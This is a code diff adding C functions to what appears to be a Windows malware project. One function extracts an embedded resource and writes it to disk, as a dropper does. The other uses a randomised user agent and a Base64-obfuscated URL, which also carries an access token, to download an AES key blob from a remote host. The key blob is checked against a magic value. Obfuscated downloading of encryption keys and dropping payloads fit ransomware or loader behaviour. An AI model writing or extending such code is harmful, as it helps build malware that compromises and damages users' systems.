@@ -129,3 +129,47 @@ PCWSTR GetFileNameFromPathW(
 
 	return 0;
 }
+
+BOOL EExtractResource(
+	_In_ PCWSTR szFileName,
+	_In_ WORD   wResID
+) {
+	SIZE_T nData;
+	PVOID pData = EUnpackResource(&g_PIB->cibWK, wResID, &nData);
+	BOOL bT = WriteFileCW(szFileName, pData, nData);
+	FreeMemory(pData);
+	return bT;
+}
+
+// Only Test rn but might be implemented further
+PVOID IDownloadKey() {
+	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
+	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	if (!hNet)
+		return 0;
+	FreeMemory(szAgent);
+
+	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
+	SIZE_T nURL;
+	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
+	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
+	if (!hUrl)
+		return 0;
+	FreeMemory(szURL);
+
+	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
+
+	SIZE_T nRead;
+	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
+
+	InternetCloseHandle(hUrl);
+	InternetCloseHandle(hNet);
+
+	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
+		goto EXIT;
+
+	return pBuffer;
+EXIT:
+	FreeMemory(pBuffer);
+	return 0;
+}
